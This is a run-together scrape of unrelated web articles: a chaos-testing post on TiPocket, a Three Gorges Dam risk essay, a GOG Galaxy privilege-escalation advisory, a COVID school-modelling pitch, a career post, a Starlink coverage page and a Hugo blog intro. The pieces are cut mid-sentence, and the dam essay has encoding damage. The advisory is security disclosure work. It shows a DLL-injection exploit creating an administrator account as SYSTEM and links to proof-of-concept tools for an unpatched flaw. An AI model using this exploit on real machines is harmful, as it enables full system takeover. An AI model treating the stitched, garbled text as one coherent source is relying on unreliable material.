href="https://github.com/pingcap/tipocket/tree/master/argo/workflow" target="_blank" rel="noopener noreferrer">TiPocket’s</a> sample workflows and templates, the design also allows you to add your own failure injection flows. Handling complicated logics using codable workflows makes Argo developer-friendly and an ideal choice for our scenarios.</p><p>Now, our chaos experiment is running automatically. But if our results do not meet our expectations? How do we locate the problem? TiDB saves a variety of monitoring information, which makes log collecting essential for enabling observability in TiPocket.</p><h2>Visualizing the results: Loki</h2><p>In cloud-native systems, observability is very important. Generally speaking, you can achieve observability through <strong>metrics</strong>, <strong>logging</strong>, and <strong>tracing</strong>. TiPocket’s main test cases evaluate TiDB clusters, so metrics and logs are our default sources for locating issues.</p><p>On Kubernetes, Prometheus is the de-facto standard for metrics. However, there is no common way for log collection. Solutions such as <a href="https://en.wikipedia.org/wiki/Elasticsearch" target="_blank" rel="noopener noreferrer">Elasticsearch</a>, <a href="https://fluentbit.io/" target="_blank" rel="noopener noreferrer">Fluent Bit</a>, and <a href="https://www.elastic.co/kibana" target="_blank" rel="noopener noreferrer">Kibana</a> perform well, but they may cause system resource contention and high maintenance costs. We decided to use <a href="https://github.com/grafana/loki" target="_blank" rel="noopener noreferrer">Loki</a>, the Prometheus-like log aggregation system from <a href="https://grafana.com/" target="_blank" rel="noopener noreferrer">Grafana</a>.</p><p>Prometheus processes TiDB’s monitoring information. Prometheus and Loki have a similar labeling system, so we can easily combine Prometheus' monitoring indicators with the corresponding pod logs and use a similar query language. Grafana also supports the Loki dashboard, which means we can use Grafana to display monitoring indicators and logs at the same time. Grafana is the built-in monitoring component in TiDB, which Loki can reuse.</p><h2>Putting them all together - TiPocket</h2><p> Now, everything is ready. Here is a simplified diagram of TiPocket:</p><p><img src="https://chaos-mesh.org/img/tipocket-architecture.png" alt="TiPocket Architecture"></p><p>As you can see, the Argo workflow manages all chaos experiments and test cases. Generally, a complete test cycle involves the following steps:</p><ol><li>Argo creates a Cron Workflow, which defines the cluster to be tested, the faults to inject, the test case, and the duration of the task. If necessary, the Cron Workflow also lets you view case logs in real-time.</li></ol><p><img src="https://chaos-mesh.org/img/argo-workflow.png" alt="Argo Workflow"></p><ol><li>At a specified time, a separate TiPocket thread is started in the workflow, and the Cron Workflow is triggered. TiPocket sends TiDB-Operator the definition of the cluster to test. In turn, TiDB-Operator creates a target TiDB cluster. Meanwhile, Loki collects the related logs.</li><li>Chaos Mesh injects faults in the cluster.</li><li>Using the test cases mentioned above, the user validates the health of the system. Any test case failure leads to workflow failure in Argo, which triggers Alertmanager to send the result to the specified Slack channel. If the test cases complete normally, the cluster is cleared, and Argo stands by until the next test.</li></ol><p><img src="https://chaos-mesh.org/img/alert_message.png" alt="Alert in Slack"></p><p>This is the complete TiPocket workflow. .</p><h2>Join us</h2><p><a href="https://github.com/pingcap/chaos-mesh" target="_blank" rel="noopener noreferrer">Chaos Mesh</a> and <a href="https://github.com/pingcap/tipocket" target="_blank" rel="noopener noreferrer">TiPocket</a> are both in active iterations.

        <h2><a href="http://thinking.farm/research/three-gorges-dam/">To Dam or Not to Dam: Exploring the Failure Risk of the Three Gorges Dam </a></h2>
            
            <section id="single-content">
                <p><em>This research explores the risk that the Three Gorges dam will experience failure.
I believe the risk that the dam becomes structurally compromised, and requires the government to drain the reservoir to undertake repairs, is  <strong>20-25%</strong>. In the case that there is a seismic event, that likelihood would be closer to <strong>80%</strong>. I put the chance of a dam failure during this summer’s ongoing floods at <strong>5-10%</strong>, rising to <strong>30%</strong> in the case of a seismic event.</em></p>
<h2 id="introduction">Introduction</h2>
<p>Did Wuhan commit a great crime in 2019? How else to explain the cityâ€™s bad luck in 2020, beginning with the COVID-19 world pandemic and continuing with recent worries that the Three Gorges Dam (TGD), the worldâ€™s largest, might burst and flood the city? News reports about the dam have primarily been journalists repeating the opinions of various experts, with some quotes dating back to the 1990s. Predictably, this has encouraged the formation of two camps: those primed towards conspiratorial speculation that the Chinese Communist Party is lying about a looming catastrophe, and those that repeat state media lines that rumors about the dam are the work of Chinaâ€™s foreign enemies.</p>
<p>Nonetheless, I think that clear thinking about risk can help us assess the likelihood of disaster at the TGD. The dam is subject to three types of risks:</p>
<ol>
<li>structural integrity risk, which originates in the damâ€™s construction and maintenance</li>
<li>foundation risk, which reflects the geologic stability of the damâ€™s foundation</li>
<li>shock risk, which the likelihood that an external shock occurs, like an earthquake or landslide.</li>
</ol>
<p>Structural integrity risk is hard to assess, but we can obtain relatively clear information to assess foundation and shock risk, if we make use of valuable geologic data gathered by the Three Gorges Development Corporation in the 1990s. Moreover, the changing rhetoric of press releases from the Chinese government can reveal how the authorities themselves, who have live access to the state of the dam, are mitigating these risks. The governmentâ€™s behavior can then further calibrate our sense of how large and realized these risks actually are.</p>
<p>I have been unable to come by reliable information to assess the structural integrity of the dam. The major risk to the dam comes from foundation risk. As can be ascertained from geologic data, Sections 1-5 of the left powerhouse lie on top of a low-dipping joints with high connectivity, meaning that there is elevated sliding risk. The damâ€™s recent deformation on July 21 means previously calculated safety ratios are likely inflated. Moreover, changes in government rhetoric support this suspicion. In contrast to years past, the government claims that the dam was never mean to control floods and that each region should figure out their own solution.</p>
<p>In terms of shock risk, the dam is susceptible to seismic activity, instability arising from the sheer weight of the TGD reservoir, and flood waves large enough to overwhelm the damâ€™s sluice gates. As of writing (July 26), the 3rd flood wave has officially formed in the Yangtze, and a 4th might appear in short succession. Overall, I think there is a 20-25% chance that the dam is further structurally impaired, prompting the government to continue draining the reservoir as fast as possible. There is something like a 5-10% chance that multiple flood waves overwhelm the dam and raise the reservoir level. These would weaken the dam or its foundation and cause a sliding failure. Were an earthquake to happen this month, these risks would be something more like 80% and 30%.</p>
<h2 id="anatomy-of-a-dam">Anatomy of a dam</h2>
<p>There are several types of dam design: arch dams, buttress dams, embankment dams, and gravity dams.</p>
<p>Arch dams hold back the water partially through the strength of their structural shape. The Hoover Dam is an example of an arch dam. The arch is convex facing upstream, which distributes water pressure along the structure to the abutments at each end.</p>
<figure>
    <img src="http://thinking.farm/hoover-dam.jpg" width="100%"> <figcaption>
            <h4>The Hoover Dam, Arizona-Nevada border</h4>
        </figcaption>
</figure>

<p>Buttress dams consist of a face slab which angles away from the upstream, and is supported on the downstream side by buttress structures. These structures are attached to a base slab foundation. Buttress dams are built in areas with looser soil foundations.</p>
<figure>
    <img src="http://thinking.farm/daniel-johnson.jpg" width="100%"> <figcaption>
            <h4>The Daniel-Johnson Buttress Dam, Canada</h4>
        </figcaption>
</figure>

<p>Embankment dams are built up by the piling up of soil, rocks, or synthetic materials. These are usually porous on their outside but have an impervious core. Their main advantage is their low cost and flexibility, which allows them to adjust to shifts in the embankment or settlement of the foundation over time.</p>
<p>Gravity dams resist water flow through their sheer weight, which pulls them vertically down and allows them to resist the horizontal force of water pressure along their surface. This is similar to what a child does when he blocks a stream or rivulet by piling rocksâ€”they divert the water flow not through any structural design but through their weight. This is the origin of the name â€œgravity dam.â€�</p>
<p>A U.S. Department of the Interior report in 1998 explored various dam â€œeventsâ€�. These include four gravity dams in the United States and one in France<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. All five suffered damage due to sliding, and two of them failed entirely. The remaining three required additional drainage, reinforcements, and the release of reservoir waters to keep water depths low. For example, the Morris Shepherd Dam suffered sliding because the initial loading of the reservoir changed the stability of the bedrock foundation such that the safety ratio fell below 1.0. In other words, the load that the dam could support before failing had fallen below the regular load the dam was supposed to hold.</p>
<h2 id="foundation-risk-is-sliding-risk">Foundation risk is sliding risk</h2>
<p>The most important factor in sliding events is the nature of the bedrock on which a gravity dam is built. In failures of this type, the part of the foundation on which the dam rests slides downstream. We have reliable data to study this phenomenon, though media and news commentators have not put in the work.</p>
<p>In 2003 scientists from the Chinese Academy of Sciences and the Yangtze River Scientific Research Institute received data and support from the Three Gorges Development Corporation, the Changjiang Water Resources Commission, and the Chinese Academy of Sciences to conduct a stability assessment of the damâ€™s foundation using physical and numerical modeling.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p>
<p>The study incorporated a variety of techniques for the stability assessment, including conventional methods of geological mapping such as borehole drilling and shaft exploration, geophysical prospecting such as acoustic emission, remote sensing, seismic reflection and refraction, electromagnetic techniques, and physical-chemical analysis and micro-structural analysis. Most of these data are recorded in expensive studies commissioned in 1998 and 1999, when the dam was being built.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup></p>
<p>They conclude that the â€œmajor factor influencing the foundation stability would come from the pre-existing discontinuities. However, among these discontinuities the faults mostly have steep dip angles, thin thickness, and well-cemented tectonite, so they would not play important roles in the foundation stability.â€�</p>
<h2 id="foundation-faults-and-joints">Foundation, faults, and joints</h2>
<p>The foundation is plagioclase granite which is homogenous and of high strength, and with various degrees of weathering, though the dam itself is on the moderately and lightly weathered parts.</p>
<p>The are 886 faults in the granite, most of which have steep angles (i.e. they go down more than sideways). 90% of these are shorter than 300 meters and narrower than 1 meter. Most of the faults are filled in with tectonite, a metamorphic type of rock.</p>
<p>The granite also has a very large number of joints. Joints are fractures where the two sides, unlike in a fault, lack visible or detectable movement relative to each other. 13% of joints have dip angles less than 30 degrees, 10% are between 30-60, and 77% are greater than 60 degrees.</p>
<p>The low-dipping joints have been studied more than the others because they dip downstream at an angle low enough to create sliding surfaces in the damâ€™s foundation. This was determined to be the greatest risk to foundation stability.</p>
<p>As we can see in the illustration below, the area of greatest risk is labeled â€œrelative developed regions of gently dipping joints,â€� which is where these low dipping joints are present in both long and short form, and in high densities. This area crosses the dam around the left powerhouse, which also overlaps with one of the large faults.</p>
<figure>
    <img src="http://thinking.farm/rock-joint-distribution.png" width="100%"> <figcaption>
            <h4>Rock joint distribution along the foundation of Three Gorges Dam (Liu et al)</h4>
        </figcaption>
</figure>

<p>Another risk factor is connectivity: the percentage of joints that could form a potential sliding path. The higher the connectivity, the higher the probability that a disturbance will link the joints into a fracture that produces a sliding event.</p>
<figure>
    <img src="http://thinking.farm/layout-of-tgd.png" width="100%"> <figcaption>
            <h4>Layout of the TGD and the numbered left powerhouse-dam sections (Liu et al)</h4>
        </figcaption>
</figure>

<p>Sections 1-5 of the left powerhouse dam are the weakest links. As can be seen below, the density of low-dipping joints is highest under Section No. 3 of the left powerhouse dam. Even more unfortunately, Section No. 3 also has the highest joint connectivityâ€”80% of the joints are in a potential sliding path!</p>

            <h4>Avg. linear density of low-dipping joints, and connectivity, for Sections No. 1-5 (Liu et al)</h4>

<p>We can appreciate the high connectivity of the joints under Section No. 3 through the geological sketches from Liu et al.</p>

        <h2><a href="https://www.positronsecurity.com/blog/2020-08-13-gog-galaxy_client-local-privilege-escalation_deuce/">GOG Galaxy Client Local Privilege Escalation Deuce</a></h2>
        
        <p>I reported <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">a serious local privilege escalation flaw in GOG Galaxy Client</a> on April 28, 2020, but my follow-up investigation (detailed below) found the vendor’s fix to be insufficient.  By updating the proof-of-concept exploit code, it is possible to execute arbitrary commands as <em>SYSTEM</em> in GOG Galaxy Client v2.0.13 through <s>v2.0.15</s> v2.0.19 (the latest as of this writing).</p>
<p>GOG did not reply that this issue was officially fixed, although changes were silently made at some point after the v2.0.15 release to stop the provided proof-of-concept tools from working.  <s>It is suspected that only minor changes were made to frustrate exploitation; an investigation is ongoing</s> (See update below).</p>
<p>UPDATE (Aug. 13, 2020 @ 5:11PM): After an investigation, it was found that GOG simply updated the signing key used for verifying messages.  This key has been recovered, and the proof-of-concept has been updated with it.  This advisory now describes a <strong>0-day vulnerability in GOG Galaxy Client v2.0.19</strong> because GOG did not respond in good faith with a proper patch in 90 days, as per <a href="https://www.google.com/about/appsecurity/">Google’s vulnerability disclosure policy</a> (which GOG was made aware of during the initial contact; see Vendor Timeline, below).</p>
<h3>Investigation of Prior Patch</h3>
<p>The day before issuing my <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">original advisory</a> on April 28, 2020, I ran the proof-of-concept exploits against the fixed versions (v1.2.67 and v2.0.14).  They no longer worked.  Unfortunately, because GOG never told me the issues were actually fixed on February 27, 2020, I didn’t have a chance to do an in-depth follow-up investigation before publishing the advisory.  I’ve since had the chance to look at their fix more deeply.</p>
<p>To start, I looked at the log file at <em>C:\ProgramData\GOG.com\Galaxy\logs\GalaxyClientService.log</em> to see if it reports anything when the old exploit is run.  I found this:</p>
<pre><code>2020-05-08 15:03:53.503 [Information][#1 (1)] [TID 7352][galaxy_service]: Received a message from process connected at '127.0.0.1:54963'.
2020-05-08 15:03:53.503 [Information][#1 (1)] [TID 7352][galaxy_service]: Determined sender to be 'C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.7_3.7.2032.0_x64__qbz5n2kfra8p0\python.exe' (PID: 8448)
2020-05-08 15:03:53.503 [Warning][#1 (1)] [TID 7352][galaxy_service]: The sender was not recognized as a trusted client.
2020-05-08 15:03:53.503 [Error][#1 (1)] [TID 7352][galaxy_service]: Received a forbidden request from an untrusted sender. Disconnecting.
</code></pre>
<p>That’s a big hint!  It looks like the privileged process, <em>GalaxyClientService.exe</em>, matches the network client’s source TCP port number with the executable process that opened the socket.  That’s how it figures out that the request is coming from the Python interpreter instead of the legitimate client (GalaxyClient.exe).</p>
<p>I immediately thought that this check can be circumvented with <a href="https://en.wikipedia.org/wiki/DLL_injection">DLL injection</a>.</p>
<h3>Updating the Proof-of-Concept</h3>
<p><em>Cue hours of re-implementing my Python proof-of-concept in C…</em></p>
<p>Ok, now I have a DLL that can be injected into <em>GalaxyClient.exe</em> which will issue the same HMAC-512-signed request as before.  Let’s test it out:</p>
<pre><code>C:\Users\user1\Desktop&gt;galaxy_dll_inject_privesc.exe --key2 C:\Windows\System32\net.exe "user jtesta Abc*123Lol /add" "C:\\"
Starting GalaxyClientService...
Executing C:\Program Files (x86)\GOG Galaxy\GalaxyClient.exe...
PID of new GalaxyClient.exe process: 10296
Injecting DLL...
DLL injected.  Waiting up to 30 seconds for pipe server to start...
Connected to pipe server.  Sending command, args, and working directory...
Sent.  Waiting for response...

Success!
</code></pre>
<p>Looks like it worked!  Ok, now let’s add this new user to the local <em>Administrators</em> group:</p>
<pre><code>C:\Users\user1\Desktop&gt;galaxy_dll_inject_privesc.exe --key2 C:\Windows\System32\net.exe "localgroup Administrators jtesta /add" "C:\\"
Starting GalaxyClientService...
Executing C:\Program Files (x86)\GOG Galaxy\GalaxyClient.exe...
PID of new GalaxyClient.exe process: 8112
Injecting DLL...
DLL injected.  Waiting up to 30 seconds for pipe server to start...
Connected to pipe server.  Sending command, args, and working directory...
Sent.  Waiting for response...

Success!
</code></pre>
<p>Let’s verify that this user exists and is part of the <em>Administrators</em> group:</p>
<pre><code>C:\Users\user1\Desktop&gt;net user jtesta
User name                    jtesta
[...]
Local Group Memberships      *Administrators       *Users
[...]
The command completed successfully.
</code></pre>
<p><strong>SUCCESS!</strong></p>
<h3>Proof-Of-Concept Exploit Tools</h3>
<p>Pre-compiled binaries and source code for the updated proof-of-concept tools (which work on GOG Galaxy v2.0.13 through v2.0.19) are available here: <a href="https://www.positronsecurity.com/blog/gog_galaxy_updated_poc_v2.zip">gog_galaxy_updated_poc_v2.zip</a> (<a href="https://www.positronsecurity.com/blog/gog_galaxy_updated_poc_v2.zip.sig">gog_galaxy_updated_poc_v2.zip.sig</a>)</p>
<p>GPG Key: <a href="https://www.positronsecurity.com/company/jtesta.asc">jtesta.asc</a> (9C61 F6A9 A3E9 BCA0 04A6  3C66 E44F 5FD3 B799 916A)</p>
<h3>Vendor Contact Timeline</h3>
<p><strong>May 12, 2020</strong>: Contact with GOG.com Support was made using the same ticket (#535258) as the <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">original advisory</a>.</p>
<p><strong>June 4, 2020</strong>: GOG.com Support replied with:</p>
<p>“I was informed that our Developers are working on fixing the issue, but executing the attack requires the machine to be already compromised.”</p>
<p>Because this sounded like GOG was not taking the issue seriously, I responded with:</p>
<p>“It is indeed true that an attacker must have low-privilege access to the machine already.  But the problem is that this can be escalated into Administrator rights by abusing the GalaxyClientService software.  […]  Local privilege escalation (LPE) is a serious vulnerability.  GOG customers may install software/games from other untrusted sources without Administrator rights, which normally would protect them from full system compromise.  Unfortunately, due to the vulnerabilities I’ve discovered in GalaxyClientService, <em>all</em> user accounts are effectively administrators.”</p>
<p><strong>August 13, 2020</strong>: No response received from vendor after 90 days, as per <a href="https://www.google.com/about/appsecurity/">Google’s vulnerability disclosure policy</a> (which GOG was informed of).  GOG did not reply with any fix information.</p>
<p>UPDATE (Aug. 13, 2020 @ 5:11PM): <em>After</em> this advisory was publicly released, GOG.com Support responded with:</p>
<p>“Our Developers reevaluated the reported issue and think that it will take them around 3 months to create a solution, because it demands a major design change.  Would it be possible to postpone the public release of your findings by 3 months so they have time to implement and test this solution?”</p>
<p>Because this was received after the advisory was already published, the request was deemed moot.</p>
<h3>Explanation of 0-Day Exploit Release</h3>
<p>(Section added on Aug. 13, 2020 @ 5:11PM)</p>
<p>As of the time of original publication (the morning of August 13), the proof-of-concept tool released worked on v2.0.13 - v2.0.15 only; it did not work on the latest version (v2.0.19) for unknown reasons.  Hours later, an investigation revealed that GOG silently updated the message-signing key some time between the release of v2.0.16 and v2.0.19 in order to prevent the exploit from working.  This was not a good-faith attempt at addressing the security vulnerability for two reasons:</p>
<p>1.) As <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">my first GOG Galaxy Client advisory clearly showed</a>, secret keys cannot be used to verify messages, since an attacker can easily extract those keys.  GOG already knew since January that this would not solve the core design problem.</p>
<p>2.) In private communication on May 12, I made note that I strongly suspected this would require an extensive re-design, and that I would be happy to help (for free) to ensure that a proper &amp; comprehensive fix would be shipped to end users.  No response regarding this offer was received (in fact, no response was received at all until the deadline had passed).</p>
<p>Because it reasonably seems that GOG is no longer acting in good-faith regarding this matter, I’ve updated the proof-of-concept again with the new signing key.  Hence, as of August 13, <strong>this is a 0-day vulnerability affecting GOG Galaxy Client v2.0.19</strong>.</p>

<blockquote><em>“We are living in a very challenging time as we plan for 8,000 people to return to our district (1,000 employees and 7,000 students) in seven short weeks. Data is critical to our success as we strive to balance health and safety with face-to-face interactions.” </em><br><em>-Darcie Mosley, Millcreek School District Superintendent</em></blockquote>

<div><p>COVID-19 represents an unprecedented challenge for K-12 educators and administrators who must make crucial reopening decisions under conditions of significant uncertainty. As the pandemic rages across the country, educational leaders have to consider the impact of every decision on students, teachers, parents, and the larger community they serve.</p><p>Questions school districts face include: When and how to open safely for students, teachers, and staff? What are the impacts on parents, extended families, the local economy, and the larger community? How to effectively compare and contrast different reopening policies, and which policy is best one for their particular school district? How should policies differ across elementary, middle, and high schools? What is the best way to update policies as new data become available? </p><p>These dilemmas are further complicated by the fact that epidemiological risk factors vary enormously based on local conditions, limiting the efficacy of broad, standardized policy responses, and that districts have few avenues by which to learn from each other’s experience. With so many lives and livelihoods at stake, decision makers need better tools to inform their choices.</p><p>Epistemix is working to help fill that gap.</p><p>Our team has spent decades building epidemiological models to combat infectious diseases in partnership with the National Institutes of Health, Bill and Melinda Gates Foundation, Robert Wood Johnson Foundation, and others. Now, we’re working with schools, health care systems, Fortune 500s, nonprofits, researchers, and federal, state, and local governments to respond to COVID-19.</p><p>Using data from the US Census, Department of Education, American Community Survey, and Bureau of Labor Statistics, our synthetic population matches actual local population statistics and demographics, and, unlike many equation-based models that lack the flexibility and granularity to compare the implications of actual policy interventions below the county level, our agent-based model uses realistic social dynamics to simulate epidemiological outcomes from the bottom-up to show the policy impact neighborhood by neighborhood across the country.</p><p>That specificity is crucial for districts trying to evaluate the relative merits of alternative school reopening strategies, focusing on health outcomes for students, teachers and the community. Using epidemiological best practice, we can model the specific, local consequences of different reopening policies on students, families, staff and the community—including the number of local COVID-19 cases, hospitalizations, and deaths most likely to result from each strategy. Our simulations account for every individual in a particular region as well as the households, schools, workplaces, disease progression, social-behavioral data, and regulations specific to that geography.</p><p>The researchers behind Epistemix studied student-student interactions and contact patterns in Pennsylvania schools when developing the platform by having students wear trackers and record journals of who they were in contact with and where those interactions took place during the day. This is one of the only studies of this kind and ours is the only software that accounts for this level of detail when modeling different policy outcomes. This study enables the Epistemix team to account for differences in grade level interactions throughout the school day and in the classroom.</p><p>Every model we build is designed to inform a specific choice the district is facing. We begin by calibrating our COVID-19 disease model to the specific local outbreak pattern, taking into account local closure rules, social distancing behavior, school closure orders, and other local events. In the images below, you can see how we fit our model to the actual disease history of Allegheny County in Pennsylvania—note that in the Total Cases graph on the right, because reported cases are always a fraction of actual cases, our model is likely to be more accurate than the county’s figures.</p></div>

<div><p>Once the initial model is calibrated to local conditions, we run scenarios for the particular reopening strategies the district is considering, for example: opening schools as normal, moving everything online, or reducing time spent in school by 50% by breaking students into cohorts. The model then maps out the implications of these strategies under community conditions like the stage of the epidemic and the number of cases in the county, broad social distancing measures like stay at home orders and masks, and macro-dynamics revealed by population density and mobility scores. The model then generates the number of cases, hospitalizations, deaths, and healthcare resources resulting from each strategy under consideration.</p><p>In the charts below, you can see the implications if all the Allegheny County school districts reduced physical attendance by 50%—how many students and teachers would be infected in school and how many infections would lead to hospitalized cases under three levels of community conditions.</p></div>

<div><p>These outputs arm superintendents with the analytics they need to implement the right policies for their districts. At its best, modeling isn’t about prediction, but insight. It makes assumptions explicit, provides shared context for discussion, and informs high-stakes decisions. It reveals counterintuitive ways in which COVID-19 interacts with the complex adaptive systems that are our schools and communities, and the steps we can take to make things better. <a href="https://f.hubspotusercontent10.net/hubfs/5670167/Epistemix__Schools_Report_Example.pdf" rel=" noopener">For more details, download a complete sample report here.</a></p><p>This data-driven approach to evaluating reopening strategies helps districts safeguard students, teachers, staff, families, and communities. In addition to modeling individual policy interventions, Epistemix is coordinating across districts to establish a network of superintendents and school leaders that can share best-practice in real-time as we continue to learn and adapt to the pandemic—tracking the efficacy of different approaches across similar districts.</p><p>So, how can we help <em>your</em> district? </p><p>For K-12 schools, Epistemix can model the impacts of different reopening policy options and provide grade-by-grade results for school district teams based on the district’s geography, number of students, population density, and reported cases in the county. For Epistemix to build and run a model for your district and community, district leaders will need to provide basic information including opening plans and contingencies, location of each school, number of students per grade per school, number of teachers and staff, and age ranges of teachers and staff (age is a major COVID-19 risk factor).&nbsp;Epistemix has been working with PA schools, hospital systems, and the state government on modeling various social distancing policies, business reopenings, social gatherings (e.g. high school football to Pittsburgh Pirates baseball games), and interactions between COVID-19 and other diseases like measles, flu, and pertussis.</p></div>

<h2>When not to program</h2>

<p>I was chatting with a friend, and the topic of making it in the software development industry came up. They were concerned that programming is so hard to break into and takes a long time, so they asked for a backup plan thatâ€™s in high demand but doesnâ€™t involve coding and isnâ€™t over-saturated like development. This perturbation led me to question their motives for getting into software in the first place. Iâ€™ll walk you through the most common wrong reasons to enter into this field, along with how to evaluate alternative options.</p>
<h2 id="everyones-doing-it">everyoneâ€™s doing it</h2>
<p>Following the herd only leads to stampedes. The sentiment of this market as saturated is dangerous to the degree that itâ€™s both accurate and inaccurate. Demand for these positions seems to grow without limit, suggesting that we have yet to hit a saturation point. At the same time, thereâ€™s been a torrential flood of new programmer supply from coding bootcamps, online tutorials, and remote workers the world over. The mismatch here is that most of the supply of new developers is at a junior skill level, but the bar for in-demand skills keeps rising higher toward the senior level.</p>
<h2 id="easy-peasy">easy peasy</h2>
<p>Another misconception stems from the belief that because developers perform their work on computers that it must be easy to do. After all, the rest of the world is mostly using these devices to watch cat videos, surf the rabbit hole of search results for a given topic, play games, and check their email. The only tricky part that those outside the industry tend to identify is the amount of typing performed, which seems trivial for anyone in a field involving large amounts of writing. The actual difficulty for programmers lies in the creative parts of the work that occur inside the developerâ€™s mind, and thus, are unseen. With few exceptions, most software engineering involves building new or modifying existing things to perform tasks they have never done before. There may be a software design in place, but itâ€™s more of a vague notion and less of a blueprint.</p>
<p>A successful developer will need to keep adapting their design when continuously thrown curveballs upon discovering new unknowns or changing requirements. Excellent developers will understand the business problems they are solving, and make decisions aligned with what will give their software the best chance for success. Truly superb developers also have top-notch communication skills to ensure their work fits seamlessly with the greater whole and are proactive about helping teammates who are stuck. This unique combination of creative and technical abilities is scarce and not easy to acquire.</p>
<h2 id="money">money</h2>
<p>Itâ€™s no secret that software is among the top paid careers, right after the medical professions. Combine high pay with far more affordable education options from bootcamps to free learning materials, and the choice appears to be a win-win. Beware of those offering income share agreements or high-interest loans to fund this form of learning. Even if you utilize entirely free information, thereâ€™s still the opportunity cost of what you could be doing with all the time you spent educating yourself. Just because thereâ€™s good money to be made doesnâ€™t make you any more qualified to make it. Become a developer if youâ€™re incredibly motivated or already possess the skills mentioned above to advance quickly beyond a junior skill level, but please donâ€™t do it for the money or just because other people are doing it.</p>
<h2 id="alternatives">alternatives</h2>
<p>Writing software isnâ€™t for everyone, but using software is what gives you leverage to automate your work and grow beyond what you can accomplish alone. If you write that software, youâ€™re trading your time for the full amount of that leverage. If you buy the software, youâ€™re paying for a portion of it. As long as your productivity improvement exceeds that softwareâ€™s cost, youâ€™re getting a good deal. More and more companies find themselves in the business of automation through software to survive in todayâ€™s economy. You may bypass the need for some software skills, but donâ€™t expect to escape them all.</p>
<p>There are many in-demand fields, so itâ€™s easier to start searching for alternatives from what youâ€™re already good at and love doing and then find which of those pay well. This trifecta of factors commonly is referenced as the best combination for making a successful career.</p>
<p><img src="https://words.okwolf.com/images/career-venn-diagram.png" alt=""></p>
<p>If you have yet to master anything that pays well, then your path is less certain. Some will start from what pays well and work backward, however that has a high likelihood of falling into the <a href="#money">money trap</a> of software development. Others will begin with what they love, but beware, not all passions make good careers. The best approach is from where you already have the most talent, even if youâ€™re struggling with applying it in ways that you enjoy and pay the bills.</p>
<p>Thereâ€™s no magic wand that instantly transports you to the intersection of this Venn diagram in the center. Many times honing your craft wonâ€™t be fun until you reach a certain level of proficiency. In these cases, thereâ€™s no substitute for trusting the process and persevering through your doubts. Even if you donâ€™t find success along the first course you set, you will learn about yourself along the journey. If you pay attention to the lessons life offers you, you will continue to make progress, the most any of us can hope for.</p>
<h2 id="program-your-mind-correctly-and-you-will-decode-the-world-of-work">Program your mind correctly, and you will decode the world of work.</h2>

August 14, 2020 | https://sebsebmc.github.io/starlink-coverage/index.html | <a href="https://web.archive.org/web/*/https://sebsebmc.github.io/starlink-coverage/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    <p>
        I am now providing two different data sets: one that is calculated witha 25 degree minimum user terminal angle
        and one with a 35 degree minimum user terminal angle. The more recent SpaceX filings show that they are capable
        of using the 25 degree minimum but that they eventually want to increase that. The previous datasets were
        calculated with a 35 degree minimum as that was what I had found on file at the time. With the lower minimum
        angle and about 100 more satellites at operational altitudes the 25 degree dataset now shows bands with
        continuous coverage.
    </p>
    <p>
        Furthermore, I plan to calculate what I call the <em>satellite multiplicity</em>, the number of satellites
        overhead at any given time on average, since the number of overlapping satellites is relevant to some
        calculations for routing and bandwith.
    </p>
    <p>
        New Features: You can now double-click a cell to toggle showing more granular data.
        Cells with 100% uptime now display a gold star. Faster parsing, reduced battery drain,
        hopefully.
    </p>
    <p><label for="minAngleSelect">Choose a minimum angle to load the dataset:</label>
        
    </p>
    
    
    <div>
        <p>This renders the percentage of the day that a portion of the earth is covered by a Starlink satellite. (Red
            is no
            coverage, blue is all day coverage).</p>
        <p>Click on a cell to see how many minutes in a day a cell is covered by at least one satellite. Note that
            currently
            for performance reasons the cells are much larger than the resolution the data was simulated at. As such the
            error within a cell can be quite large, especially near the poles where the coverage drops off rapidly.
        </p>
        <p>In my opinion anything less than 1440 minutes (aka continuous coverage) means that SpaceX <em>should not</em>
            provide service in that area.</p><p>
        For more info about how it's calculated:
        <a href="https://github.com/sebsebmc/starlink-coverage">https://github.com/sebsebmc/starlink-coverage</a></p><h2> Changelog:</h2>
        <ul>
            <li>6-20-20 - Removed satellites that had low altitudes because they are not believed to be in operational
                orbits.</li>
            <li>6-21-20 - Fixed remaining issues with calculations at the antimerdian.</li>
            <li>7-31-20 - <ul>
                    <li>Added a double-click option to view higher resolution data. Double-click again to revert.</li>
                    <li>Added a 25 minimum degree dataset</li>
                    <li>Use gold star to mark cells with 100% uptime</li>
                    <li>Switched to new format and explicit rendering</li>
                </ul>

<p>
  <span>
H</span>
  ello and welcome to my website! Given all of this extra time I have had at home recently, I figured it was finally time to stand up a website to publish some blog posts I have been meaning to write. As any self respecting software engineer would do in this case, my plan was to build it all myself.


</p>

<p>Having not considered the ecosystem of static content generation sites for quite some time, I hit the books to figure what my options are.</p>
<h2 id="wait-its-all-javascript">Wait, it’s all JavaScript?!</h2>
<p>The very first first thing I noticed was that almost every solution required JavaScript, either at build time or on the client. JavaScript has no business being involved in static text based context, HTML and CSS already do an amazing job.</p>
<p>At the end of the day, there was only a single viable solution that passed the test of being relevant and not using JavaScript, <a href="https://gohugo.io/">Hugo</a>.</p>
<h2 id="styling">Styling</h2>
<p>Hugo at its core is really nothing more than a very feature rich HTML template renderer, which is exactly the right tool for the job of generating markup, but what about styling?</p>
<p>I chose to just use <a href="https://sass-lang.com/">SASS</a>. Using nothing but SASS is amazing for a project this small. I wrote all of the styling myself, which for text based content, really isn’t that bad.</p>
<p>Hugo offers a library of themes, but I personally find the usage of themes to be a bit tacky. I wanted something that is uniquely mine, and more importantly, doesn’t add a bunch of shit I will never use.</p>
<h2 id="hosting--deployment">Hosting &amp; deployment</h2>
<p>Hosting static content in 2020 is so easy it should be <em>illegal</em>. I use <a href="https://pages.github.com/">GitHub Pages</a> as the host, which really is as simple as turning it on in the repository settings.</p>
<p>Similarly, deployment is disgustingly easy with <a href="https://github.com/features/actions">GitHub Actions</a>. My configuration file is triggered by every push to master, which then:</p>
